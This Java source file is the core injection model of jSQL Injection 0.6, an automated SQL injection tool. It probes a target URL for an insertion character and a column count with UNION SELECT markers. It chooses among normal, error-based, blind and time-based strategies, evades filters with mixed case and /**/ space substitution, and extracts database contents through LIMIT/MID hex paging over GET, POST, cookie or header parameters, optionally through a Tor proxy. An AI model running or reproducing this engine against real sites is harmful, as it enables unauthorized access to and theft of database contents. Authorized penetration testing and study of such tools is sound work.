/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.prefs.Preferences;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.controller.InjectionController;
import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.ao.DataAccessObject;
import com.jsql.model.ao.RessourceAccessObject;
import com.jsql.model.bean.ElementDatabase;
import com.jsql.model.bean.Request;
import com.jsql.model.interruptable.Interruptable;
import com.jsql.model.interruptable.Stoppable;
import com.jsql.model.pattern.strategy.BlindStrategy;
import com.jsql.model.pattern.strategy.ErrorbasedStrategy;
import com.jsql.model.pattern.strategy.IInjectionStrategy;
import com.jsql.model.pattern.strategy.NormalStrategy;
import com.jsql.model.pattern.strategy.TimeStrategy;
import com.jsql.tool.StringTool;
import com.jsql.view.GUI;
import com.jsql.view.GUIMediator;

/**
 * Model in charge of injection, MVC functionalities are provided by ModelObservable
 */
public class InjectionModel extends ModelObservable {
    public final static String JSQLVERSION = "0.6";

    public String insertionCharacter;       // i.e, -1 in "[...].php?id=-1 union select[...]"
    public String firstSuccessPageSource;       // HTML source of page successfully responding to multiple fileds selection (select 1,2,3,...)
    public String initialUrl;       // url entered by user
    public String visibleIndex;       // i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source
    public String initialQuery;       // initialUrl transformed to a correct injection url

    public String method;       // GET, POST, COOKIE, HEADER (State/Strategy pattern)

    public String getData;
    public String postData;
    public String cookieData;
    public String headerData;

    public String versionDB;
    public String currentDB;
    public String currentUser;
    public String authenticatedUser;

    public String proxyAddress;
    public String proxyPort;

    public String pathFile;

    public boolean isProxyfied = false;

    public IInjectionStrategy injectionStrategy;
    public BlindStrategy blindStrategy = new BlindStrategy();
    public ErrorbasedStrategy errorbasedStrategy = new ErrorbasedStrategy();
    public NormalStrategy normalStrategy = new NormalStrategy();
    public TimeStrategy timeStrategy = new TimeStrategy();

    public boolean isInjectionBuilt = false;     // Allow to directly start an injection after a failed one
    // without asking the user 'Start a new injection?'

    public RessourceAccessObject rao = new RessourceAccessObject();
    public DataAccessObject dao = new DataAccessObject();
    
    public int securitySteps = 0;           // Current evasion step, 0 is 'no evasion'

    public static Logger logger = Logger.getLogger(InjectionModel.class);

    public InjectionModel(){
        logger.info("jSQL Injection version "+ JSQLVERSION);

        String sVersion = System.getProperty("java.version");
        sVersion = sVersion.substring(0, 3);
        Float fVersion = Float.valueOf(sVersion);
        if (fVersion.floatValue() < (float) 1.7) {
            InjectionModel.logger.warn("You are running an old version of Java, please install the latest version from java.com.");
        }

        // Use Preferences API to persist proxy configuration
        Preferences prefs = Preferences.userRoot().node(InjectionModel.class.getName());

        this.isProxyfied = prefs.getBoolean("isProxyfied", false);  // Default proxy disabled
        this.proxyAddress = prefs.get("proxyAddress", "127.0.0.1"); // Default TOR config
        this.proxyPort = prefs.get("proxyPort", "8118");            // Default TOR config
        this.pathFile = prefs.get("pathFile", System.getProperty("user.dir"));

        if(isProxyfied){
            System.setProperty("http.proxyHost", proxyAddress);
            System.setProperty("http.proxyPort", proxyPort);
        }
    }

    /**
     * Prepare the injection process, can be interrupted by the user (via stopFlag)
     */
    public void inputValidation(){          // Erase all attributes eventually defined in a previous injection
        insertionCharacter =
                visibleIndex =
                initialQuery =

                versionDB =
                currentDB =
                currentUser =
                authenticatedUser = null;

        stopFlag =
                isInjectionBuilt = false;
        
        this.injectionStrategy = null;
        
        rao.hasFileRight = false;

        try{
            // Test if proxy is available then apply settings
            if(isProxyfied && !proxyAddress.equals("") && !proxyPort.equals("")){
                try {
                    InjectionModel.logger.info("Testing proxy...");
                    new Socket(proxyAddress, Integer.parseInt(proxyPort)).close();
                } catch (Exception e) {
                    throw new PreparationException("Proxy connection failed: " + proxyAddress+":"+proxyPort+
                            "\nVerify your proxy informations or disable proxy setting.");
                }
                InjectionModel.logger.info("Proxy is responding.");
            }

            // Test the HTTP connection
            try {
                InjectionModel.logger.info("Starting new injection");
                InjectionModel.logger.info("Connection test...");

                URLConnection con = new URL(this.initialUrl).openConnection();
                con.setReadTimeout(15000);
                con.setConnectTimeout(15000);

                BufferedReader reader = new BufferedReader(new InputStreamReader( con.getInputStream() ));
                reader.readLine();
                reader.close();
            } catch (IOException e) {
                throw new PreparationException("Connection problem: " + e.getMessage());
            }

            // Define insertionCharacter, i.e, -1 in "[...].php?id=-1 union select[...]",
            InjectionModel.logger.info("Get insertion character...");
            this.insertionCharacter = new Stoppable_getInsertionCharacter().begin();

            // Test each injection methods: time, blind, error, normal
            timeStrategy.checkApplicability();
            blindStrategy.checkApplicability();
            errorbasedStrategy.checkApplicability();
            normalStrategy.checkApplicability();

            // Choose the most efficient method: normal > error > blind > time
        	if( !this.normalStrategy.isApplicable() ){
            	if(this.errorbasedStrategy.isApplicable()/* && etape==2*/){
                    errorbasedStrategy.applyStrategy();
                }else if(this.blindStrategy.isApplicable()/* && etape==2*/){
                	blindStrategy.applyStrategy();
                }else if(this.timeStrategy.isApplicable()/* && etape==2*/){
                    timeStrategy.applyStrategy();
                }else{
                    // No injection possible, increase evasion level and restart whole process
                    securitySteps++;
                    if(securitySteps<=2){
                        InjectionModel.logger.warn("Injection not possible, testing evasion n°"+securitySteps+"...");
                        getData += insertionCharacter; // sinon perte de insertionCharacter entre 2 injections
                        inputValidation();
                        return;
                    }else
                        throw new PreparationException("Injection not possible, work stopped");
                }
            }else{
                normalStrategy.applyStrategy();

                try{
                    // Define visibleIndex, i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source
                    this.visibleIndex = this.getVisibleIndex(this.firstSuccessPageSource);
                }catch(ArrayIndexOutOfBoundsException e){
                    // Rare situation where injection fails after being validated, try with some evasion
                    securitySteps++;
                    if(securitySteps<=2){
                        InjectionModel.logger.warn("Injection not possible, testing evasion n°"+securitySteps+"...");
                        getData += insertionCharacter; // sinon perte de insertionCharacter entre 2 injections
                        inputValidation();
                        return;
                    }else
                        throw new PreparationException("Injection not possible, work stopped");
                }
            }

            // Get the initial informations from database
            dao.getDBInfos();

            // Stop injection if database is too old
            if(versionDB.charAt(0) == '4' || versionDB.charAt(0) == '3')
                throw new PreparationException("Old database, automatic search is not possible");

            // Get the databases
            dao.listDatabases();
            
            InjectionModel.logger.info("Done.");
            isInjectionBuilt = true;
        }catch(PreparationException e){
            InjectionModel.logger.warn(e.getMessage());
        }catch(StoppableException e){
            InjectionModel.logger.warn(e.getMessage());
        }finally{
            Request request = new Request();
            request.setMessage("EndPreparation");
            this.interact(request);
        }
    }

    /**
     * Runnable class, define insertionCharacter that will be used by all futures requests,
     * i.e -1 in "[...].php?id=-1 union select[...]", sometimes it's -1, 0', 0, etc,
     * this class/function tries to find the working one by searching a special error message
     * in the source page
     */
    private class Stoppable_getInsertionCharacter extends Stoppable{
        @Override
        public String action(Object... args) throws PreparationException, StoppableException {
            // Has the url a query string?
            if( GUIMediator.model().method.equalsIgnoreCase("GET") && (GUIMediator.model().getData == null || GUIMediator.model().getData.equals("")) ){
                throw new PreparationException("No query string");
            // Is the query string well formed?
            }else if( GUIMediator.model().method.equalsIgnoreCase("GET") && GUIMediator.model().getData.matches("[^\\w]*=.*") ){
                throw new PreparationException("Incorrect query string");
            }else if( GUIMediator.model().method.equalsIgnoreCase("POST") && GUIMediator.model().postData.indexOf("=")<0 ){
                throw new PreparationException("Incorrect POST datas");
            }else if( GUIMediator.model().method.equalsIgnoreCase("COOKIE") && GUIMediator.model().cookieData.indexOf("=")<0 ){
                throw new PreparationException("Incorrect COOKIE datas");
            }else if( !GUIMediator.model().headerData.equals("") && GUIMediator.model().headerData.indexOf(":")<0 ){
                throw new PreparationException("Incorrect HEADER datas");
            // Parse query information: url=>everything before the sign '=',
            // start of query string=>everything after '='
            }else if( GUIMediator.model().method.equalsIgnoreCase("GET") && !GUIMediator.model().getData.matches(".*=$") ){
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(GUIMediator.model().getData);
                regexSearch.find();
                try{
                    GUIMediator.model().getData = regexSearch.group(1);
                    return regexSearch.group(2);
                }catch(IllegalStateException e){
                    throw new PreparationException("Incorrect GET format");
                }
            // Parse post information
            }else if( GUIMediator.model().method.equalsIgnoreCase("POST") && !GUIMediator.model().postData.matches(".*=$") ){
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(GUIMediator.model().postData);
                regexSearch.find();
                try{
                    GUIMediator.model().postData = regexSearch.group(1);
                    return regexSearch.group(2);
                }catch(IllegalStateException e){
                    throw new PreparationException("Incorrect POST format");
                }
            // Parse cookie information
            }else if( GUIMediator.model().method.equalsIgnoreCase("COOKIE") && !GUIMediator.model().cookieData.matches(".*=$") ){
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(GUIMediator.model().cookieData);
                regexSearch.find();
                try{
                    GUIMediator.model().cookieData = regexSearch.group(1);
                    return regexSearch.group(2);
                }catch(IllegalStateException e){
                    throw new PreparationException("Incorrect Cookie format");
                }
            // Parse header information
            }else if( GUIMediator.model().method.equalsIgnoreCase("HEADER") && !GUIMediator.model().headerData.matches(".*:$") ){
                Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(GUIMediator.model().headerData);
                regexSearch.find();
                try{
                    GUIMediator.model().headerData = regexSearch.group(1);
                    return regexSearch.group(2);
                }catch(IllegalStateException e){
                    throw new PreparationException("Incorrect Header format");
                }
            }

            // Parallelize the search and let the user stops the process if needed.
            // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
            // and check if a correct error message is sent back by the server:
            //         Unknown column '1337' in 'order clause'
            // or   supplied argument is not a valid MySQL result resource
            ExecutorService taskExecutor = Executors.newCachedThreadPool();
            CompletionService<SimpleCallable> taskCompletionService = new ExecutorCompletionService<SimpleCallable>(taskExecutor);
            for( String insertionCharacter : new String[] {"0","0'","'","-1","1","\"","-1)"} )
                taskCompletionService.submit(new SimpleCallable(insertionCharacter + "+order+by+1337--+",insertionCharacter));

            int total=7;
            while(0<total){
                // The user need to stop the job
                if(this.shouldStop()) throw new StoppableException();
                try {
                    SimpleCallable currentCallable = taskCompletionService.take().get();
                    total--;
                    String pageSource = currentCallable.content;
                    if(Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() ||
                            Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches()){
                        return currentCallable.tag; // the correct character
                    }
                } catch (InterruptedException e) {
                    InjectionModel.logger.error(e, e);
                } catch (ExecutionException e) {
                    InjectionModel.logger.error(e, e);
                }
            }

            // Nothing seems to work, forces 1 has the character
            return "1";
        }
    }

    /**
     * Runnable class, search the correct number of fields in the SQL query.
     * Parallelizes the search, provides the stop capability
     */
    public class Stoppable_getInitialQuery extends Stoppable{
        @Override
        public String action(Object... args) throws PreparationException, StoppableException {
            // Parallelize the search
            ExecutorService taskExecutor = Executors.newCachedThreadPool();
            CompletionService<SimpleCallable> taskCompletionService = new ExecutorCompletionService<SimpleCallable>(taskExecutor);

            boolean requestFound = false;
            String selectFields, initialQuery="";
            int selectIndex;

            // SQL: each field is built has the following 1337[index]7330+1
            // Search if the source contains 1337[index]7331, this notation allows to exclude
            // pages that display our own url in the source
            for(selectIndex=1, selectFields="133717330%2b1"; selectIndex<=10 ;selectIndex++, selectFields += ",1337"+selectIndex+"7330%2b1")
                taskCompletionService.submit(new SimpleCallable(insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));

            int total=10;

            try {
                // Starting up with 10 requests, loop until 100
                while( !requestFound && total<99 ){
                    // Breaks the loop if the user needs
                    if(this.shouldStop()) throw new StoppableException();

                    SimpleCallable currentCallable = taskCompletionService.take().get();
                    
                    // Found a correct mark 1337[index]7331 in the source
                    if(Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
                    	GUIMediator.model().firstSuccessPageSource = currentCallable.content;
                        initialQuery = currentCallable.url.replaceAll("0%2b1","1");
                        requestFound = true;
                    // Else add a new index
                    }else{
                        selectIndex++;
                        selectFields += ",1337"+selectIndex+"7330%2b1";
                        taskCompletionService.submit(new SimpleCallable(insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
                        total++;
                    }
                }
                taskExecutor.shutdown();
                taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
            } catch (InterruptedException e) {
            	InjectionModel.logger.error(e, e);
            } catch (ExecutionException e) {
            	InjectionModel.logger.error(e, e);
            }

            if(requestFound)
                return initialQuery.replaceAll("\\+\\+union\\+select\\+.*?--\\+$","+");
            return "";
        }
    }

    /**
     * Runnable class, search the most efficient index.
     * Some indexes will display a lots of characters, others won't, so sort them
     * by order of efficiency: find the one that display the most of characters
     */
    private String getVisibleIndex(String firstSuccessPageSource) {
        // Parse all indexes found
        Matcher regexSearch = Pattern.compile("1337(\\d+?)7331", Pattern.DOTALL).matcher(firstSuccessPageSource);
        ArrayList<String> foundIndexes = new ArrayList<String>();
        while(regexSearch.find())
            foundIndexes.add( regexSearch.group(1) );

        String[] indexes = foundIndexes.toArray(new String[foundIndexes.size()]);

        // Make url shorter, replace useless indexes from 1337[index]7331 to 1
        this.initialQuery = this.initialQuery.replaceAll("1337(?!"+ StringTool.join(indexes,"|") +"7331)\\d*7331","1");
        if(indexes.length == 1)
            return indexes[0];

        // Replace correct indexes from 1337[index]7331 to
        //     (select concat('SQLi',[index],repeat('#',1024),'iLQS'))
        // ==> SQLi[index]######...######iLQS
        // Search for index that displays the most #
        String performanceQuery =
                this.initialQuery.replaceAll(
                        "1337("+ StringTool.join(indexes,"|") +")7331",
                        "(select+concat(0x53514c69,$1,repeat(0xb8,1024),0x694c5153))"
                        );

        String performanceSourcePage = this.inject(performanceQuery);

        // Build a 2D array of string with:
        //     column 1: index
        //     column 2: # found, so #######...#######
        regexSearch = Pattern.compile("SQLi(\\d+)(#*)", Pattern.DOTALL).matcher(performanceSourcePage);
        ArrayList<String[]> performanceResults = new ArrayList<String[]>();
        while(regexSearch.find())
            performanceResults.add( new String[]{regexSearch.group(1),regexSearch.group(2)} );

        // Switch from previous array to 2D integer array
        //     column 1: length of #######...#######
        //     column 2: index
        Integer[][] lengthFields = new Integer[performanceResults.size()][2];
        for(int i=0; i < performanceResults.size() ;i++)
            lengthFields[i] =
            new Integer[]{
                performanceResults.get(i)[1].length(),
                Integer.parseInt(performanceResults.get(i)[0])
        };

        // Sort by length of #######...#######
        Arrays.sort(lengthFields, new Comparator<Integer[]>() {
            @Override
            public int compare(Integer[] s1, Integer[] s2) {
                Integer t1 = s1[0];
                Integer t2 = s2[1];
                return t1.compareTo(t2);
            }
        });

        // Replace all others indexes by 1
        this.initialQuery =
                this.initialQuery.replaceAll(
                        "1337(?!"+ lengthFields[lengthFields.length-1][1] +"7331)\\d*7331",
                        "1"
                        );
        return Integer.toString(lengthFields[lengthFields.length-1][1]);
    }

    /**
     * Get all data from a SQL request (remember that data will often been cut, we need to reach ALL the data)
     * We expect the following well formed line:
     * => hh[0-9A-F]*jj[0-9A-F]*c?hhgghh[0-9A-F]*jj[0-9A-F]*c?hhg...hi
     * We must check if that long line is cut, and where it is cut, basically we will move our position in a virtual 2D array,
     * and use LIMIT and MID to move the cursor ; LIMIT skips whole line (useful if result contains 1 or more complete row) ; and
     * MID skips characters in a line (useful if result contains less than 1 row)
     * The process can be interrupted by the user (stop/pause)
     */
    public class Stoppable_loopIntoResults extends Stoppable{
    	public Stoppable_loopIntoResults() {}
    	
        public Stoppable_loopIntoResults(Interruptable interruptable){
            super(interruptable);
        }

		@Override
        public String action(Object... args) throws PreparationException, StoppableException {
            String initialSQLQuery = (String) args[0];
            String[] sourcePage = (String[]) args[1];
            boolean useLimit = (Boolean) args[2];
            int numberToFind = (Integer) args[3];
            ElementDatabase searchName = (ElementDatabase) args[4];

            String sqlQuery = new String(initialSQLQuery).replaceAll("\\{limit\\}","");

            IInjectionStrategy istrategy = injectionStrategy;
            /**
             * As we know the expected number of rows (numberToFind), then it stops injection if all rows are found,
             * keep track of rows we have reached (limitSQLResult) and use these to skip entire rows,
             * keep track of characters we have reached (startPosition) and use these to skip characters,
             */
            String finalResultSource = "", currentResultSource = "";
            for(int limitSQLResult=0, startPosition=1/*, i=1*/;;startPosition = currentResultSource.length()+1/*, i++*/){

//                try {
//                    Thread.sleep(500);
//                } catch (InterruptedException e) {
//                    this.model.sendDebugMessage(e);
//                }
                //                try { /*System.out.println("loop: "+currentResultSource);*/ } catch (InterruptedException e) { this.model.sendDebugMessage(e); }
                //                if(isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())) throw new StoppableException();
                if(this.shouldStop() || (interruptable != null && interruptable.PAUSEshouldStopPAUSE())) break;

                sourcePage[0] = istrategy.inject(sqlQuery, startPosition+"", interruptable, this);
                
                // Parse all the data we have retrieved
                Matcher regexSearch = Pattern.compile("SQLi([0-9A-Fghij]+)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(sourcePage[0]);

                /**
                 * Ending condition:
                 * One row could be very long, longer than the database can provide
                 * #Need verification
                 */
                if(!regexSearch.find()){
                    if( useLimit && !finalResultSource.equals("") ){
                        //                        model.sendMessage("A");
                        // Update the view only if there are value to find, and if it's not the root (empty tree)
                        if(numberToFind>0 && searchName != null){
                            Request request = new Request();
                            request.setMessage("UpdateProgress");
                            request.setParameters(searchName, numberToFind);
                            InjectionModel.this.interact(request);
                        }
                        break;
                    }
                }

                /**
                 * Add the result to the data already found, informs the view about it
                 * If throws exception, inform the view about the failure
                 */
                try{
                    currentResultSource += regexSearch.group(1);

                    Request request = new Request();
                    request.setMessage("MessageChunk");
                    request.setParameters(regexSearch.group(1)+" ");
                    InjectionModel.this.interact(request);
                }catch(IllegalStateException e){
                    if(searchName != null){ // if it's not the root (empty tree)
                        Request request = new Request();
                        request.setMessage("EndProgress");
                        request.setParameters(searchName);
                        InjectionModel.this.interact(request);
                    }
                    throw new PreparationException("Fetching fails: no data to parse for "+searchName);
                }

                /**
                 * Check how many rows we have collected from the beginning of that chunk
                 */
                regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
                int nbResult=0;
                while(regexSearch.find()){
                    nbResult++;
                }

                /**
                 * Inform the view about the progression
                 */
                if( useLimit ){
                    if(numberToFind>0 && searchName != null){
                        Request request = new Request();
                        request.setMessage("UpdateProgress");
                        request.setParameters(searchName, limitSQLResult + nbResult);
                        InjectionModel.this.interact(request);
                    }
                    //                    System.out.println("Request " + i + ", data collected "+(limitSQLResult + nbResult) + (numberToFind>0?"/"+numberToFind:"") + " << " + currentResultSource.length() + " bytes" );
                }

                /**
                 * We have properly reached the i at the end of the query: iLQS
                 * => hhxxxxxxxxjj00hhgghh...hiLQS
                 */
                /* Design Pattern: State? */
                if(currentResultSource.contains("i")){
                    /**
                     * Remove everything after our result
                     * => hhxxxxxxxxjj00hhgghh...h |-> iLQSjunk
                     */
                    finalResultSource += currentResultSource = Pattern.compile("i.*", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");
                    if( useLimit ){
                        /**
                         * Remove everything not properly attached to the last row:
                         * 1. very start of a new row: XXXXXhhg[ghh]$
                         * 2. very end of the last row: XXXXX[jj00]$
                         */
                        finalResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
                        currentResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");

                        /**
                         * Check either if there is more than 1 row and if there is less than 1 complete row
                         */
                        regexSearch = Pattern.compile("[0-9A-F]hhgghh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
                        Matcher regexSearch2=Pattern.compile("h[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);

                        /**
                         * If there is more than 1 row, delete the last incomplete one in order to restart properly from it at the next loop,
                         * else if there is 1 row but incomplete, mark it as cut with the letter c
                         */
                        if(regexSearch.find()){
                            finalResultSource = Pattern.compile("hh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
                        }else if(regexSearch2.find()){
                            finalResultSource += "jj31chh";
                        }

                        /**
                         * Check how many rows we have collected from the very beginning of the query,
                         * then skip every rows we have already found via LIMIT
                         */
                        regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource);

                        nbResult=0;
                        while(regexSearch.find()){
                            nbResult++;
                        }
                        limitSQLResult = nbResult;

                        // Inform the view about the progression
                        //                        System.out.println("Request " + i + ", data collected " + limitSQLResult + (numberToFind>0 ? "/"+numberToFind : "" ));
                        if(numberToFind>0 && searchName != null){
                            Request request = new Request();
                            request.setMessage("UpdateProgress");
                            request.setParameters(searchName, limitSQLResult);
                            InjectionModel.this.interact(request);
                        }

                        /**
                         * Ending condition: every expected rows have been retrieved.
                         * Inform the view about the progression
                         */
                        if( limitSQLResult == numberToFind ){
                            //                            model.sendMessage("B");
                            if(numberToFind>0 && searchName != null){
                                Request request = new Request();
                                request.setMessage("UpdateProgress");
                                request.setParameters(searchName, numberToFind);
                                InjectionModel.this.interact(request);
                            }
                            break;
                        }

                        /**
                         *  Add the LIMIT statement to the next SQL query and reset variables:
                         *  Put the character cursor to the beginning of the line, and reset the result of the current query
                         */
                        sqlQuery = Pattern.compile("\\{limit\\}", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(initialSQLQuery).replaceAll("+limit+" + limitSQLResult + ",65536");
                        startPosition=1;
                        currentResultSource="";
                    }else {
                        // Inform the view about the progression
                        //                        model.sendMessage("C");
                        if(numberToFind>0 && searchName != null){
                            Request request = new Request();
                            request.setMessage("UpdateProgress");
                            request.setParameters(searchName, numberToFind);
                            InjectionModel.this.interact(request);
                        }
                        break;
                    }
                    /**
                     * Check if the line is odd or even, make it even (every character must be on 2 char, e.g A is 41, if we only have 4, then delete the 4)
                     * #Need verification
                     */
                }else if(currentResultSource.length() % 2 == 0){
                    currentResultSource = currentResultSource.substring(0, currentResultSource.length()-1);
                }

            }

            return finalResultSource;
        }
    }

    /**
     * Used to inject without need of index (select 1,2,...)
     * -> first index test (getVisibleIndex), errorbased test, and errorbased, blind, timed injection
     */
    public String inject( String dataInjection ){
        return this.inject(dataInjection, null, false);
    }

    /**
     * Run a HTTP connection to the web server
     * @param dataInjection SQL query
     * @param responseHeader unused
     */
    public String inject( String dataInjection, String[] responseHeader, boolean useVisibleIndex ){
        HttpURLConnection connection = null;
        URL urlObject = null;

        // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
        String urlUltimate = this.initialUrl;
        dataInjection = dataInjection.replace("\\", "\\\\"); // escape crazy characters, like \

        try {
            urlObject = new URL(urlUltimate);
        } catch (MalformedURLException e) {
            InjectionModel.logger.warn("Malformed URL " + e.getMessage());
        }

        /**
         * Build the GET query string infos
         * Add primary evasion
         */
        if(this.getData != null && !this.getData.equals("")){
            urlUltimate += this.buildQuery("GET", getData, useVisibleIndex, dataInjection);
            try {
                /**
                 * Evasion
                 */
                switch(securitySteps){
                /**
                 * Case evasion (for noobz) (are you making a degree? btw I love you)
                 */
                case 1: urlUltimate = urlUltimate
                        .replaceAll("union\\+", "uNiOn+")
                        .replaceAll("select\\+", "sElEcT+")
                        .replaceAll("from\\+", "FrOm+")
                        .replaceAll("from\\(", "FrOm(")
                        .replaceAll("where\\+", "wHeRe+")
                        .replaceAll("([AE])=0x", "$1+lIkE+0x")
                        ;
                break;
                /**
                 * Case + Space evasion
                 */
                case 2: urlUltimate = urlUltimate
                        .replaceAll("union\\+", "uNiOn/**/")
                        .replaceAll("select\\+", "sElEcT/**/")
                        .replaceAll("from\\+", "FrOm/**/")
                        .replaceAll("from\\(", "FrOm(")
                        .replaceAll("where\\+", "wHeRe/**/")
                        .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x")
                        ;
                urlUltimate = urlUltimate.replaceAll("--\\+", "--")
                        .replaceAll("\\+", "/**/")
                        ;
                break;
                }
                //                System.out.println(new Date() + " " + urlUltimate);
                urlObject = new URL(urlUltimate);
            } catch (MalformedURLException e) {
                InjectionModel.logger.warn("Malformed URL " + e.getMessage());
            }
        }

        // Define the connection
        try {
            connection = (HttpURLConnection) urlObject.openConnection();
            connection.setReadTimeout(15000);
            connection.setConnectTimeout(15000);
        } catch (IOException e) {
            InjectionModel.logger.warn("Error during connection: " + e.getMessage());
        }

        Map<String, Object> msgHeader = new HashMap<String, Object>();
        msgHeader.put("Url", urlUltimate);
        
        /**
         * Build the COOKIE and logs infos
         * #Need primary evasion
         */
        if(!this.cookieData.equals("")){
            connection.addRequestProperty("Cookie", this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection));
            
            msgHeader.put("Cookie", this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection));
        }

        /**
         * Build the HEADER and logs infos
         * #Need primary evasion
         */
        if(!this.headerData.equals("")){
            for(String s: this.buildQuery("HEADER", headerData, useVisibleIndex, dataInjection).split(";")){
                try {
                    connection.addRequestProperty(s.split(":",2)[0], URLDecoder.decode(s.split(":",2)[1],"UTF-8"));
                } catch (UnsupportedEncodingException e) {
                    InjectionModel.logger.warn("Unsupported header encoding " + e.getMessage());
                }
            }
            
            msgHeader.put("Header", this.buildQuery("HEADER", headerData, useVisibleIndex, dataInjection));
        }

        /**
         * Build the POST and logs infos
         * #Need primary evasion
         */
        if(!this.postData.equals("")){
            try {
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
                dataOut.writeBytes(this.buildQuery("POST", postData, useVisibleIndex, dataInjection));
                dataOut.flush();
                dataOut.close();
                
                msgHeader.put("Post", this.buildQuery("POST", postData, useVisibleIndex, dataInjection));
            } catch (IOException e) {
                InjectionModel.logger.warn("Error during POST connection " + e.getMessage());
            }
        }

        /**
         * Add info and header response to the logs
         */
        Map<String, String> msgResponse = new HashMap<String, String>();
        for (int i=0; ;i++) {
            String headerName = connection.getHeaderFieldKey(i);
            String headerValue = connection.getHeaderField(i);
            if (headerName == null && headerValue == null) break;
            
            msgResponse.put(headerName == null ? "Method" : headerName, headerValue);
        }
        msgHeader.put("Response", msgResponse);

        // Inform the view about the log infos
        Request request = new Request();
        request.setMessage("MessageHeader");
        request.setParameters(msgHeader);
        this.interact(request);

        // Request the web page to the server
        String line, pageSource = "";
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader( connection.getInputStream() ));
            while( (line = reader.readLine()) != null ) pageSource += line;
            reader.close();
        } catch (MalformedURLException e) {
            InjectionModel.logger.warn("Malformed URL " + e.getMessage());
        } catch (IOException e) {
            InjectionModel.logger.warn("Read error " + e.getMessage()); /* lot of timeout in local use */
        }

        // return the source code of the page
        return pageSource;
    }

    /**
     * Build a correct data for GET, POST, COOKIE, HEADER
     * Each can be:
     *  - raw data (no injection)
     *  - SQL query without index requirement
     *  - SQL query with index requirement
     * @param dataType Current method to build 
     * @param newData Beginning of the request data
     * @param useVisibleIndex False if request doesn't use indexes
     * @param urlPremiere SQL statement
     * @return Final data
     */
    private String buildQuery( String dataType, String newData, boolean useVisibleIndex, String urlPremiere ){
        if(!this.method.equalsIgnoreCase(dataType)){
            return newData;
        }else if(!useVisibleIndex){
            return newData + urlPremiere;
        }else{
            return newData + this.initialQuery.replaceAll("1337"+visibleIndex+"7331","("+urlPremiere+")");
        }
    }

//    /**
//     * Inform the view about a console message
//     * @param message
//     */
//    public void sendFirstMessage(String message) {
//        Request request = new Request();
//        request.setMessage("MessageConsole");
//        request.setParameters(message);
//        this.interact(request);
//    }
    
    public void sendResponseFromSite(String message, String source) {
//        InjectionModel.logger.info( message + ", response from site:\n>>>"+ source );
    	logger.info( message + ", response from site:" );
    	logger.info( ">>>"+ source );
    }

    public static void main(String[] args) {
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                GUIMediator.register(new InjectionModel());
                GUIMediator.register(new InjectionController());
                GUIMediator.register(new GUI());
            }
        });
    }

	public void applyStrategy(IInjectionStrategy injectionStrategy) {
		this.injectionStrategy = injectionStrategy; 
	}

	public void applyStrategy(String text) {
		if(text.equalsIgnoreCase("timebased")) this.injectionStrategy = timeStrategy;
		else if(text.equalsIgnoreCase("blind")) this.injectionStrategy = blindStrategy;
		else if(text.equalsIgnoreCase("errorbased")) this.injectionStrategy = errorbasedStrategy;
		else if(text.equalsIgnoreCase("normal")) this.injectionStrategy = normalStrategy;
	}
}
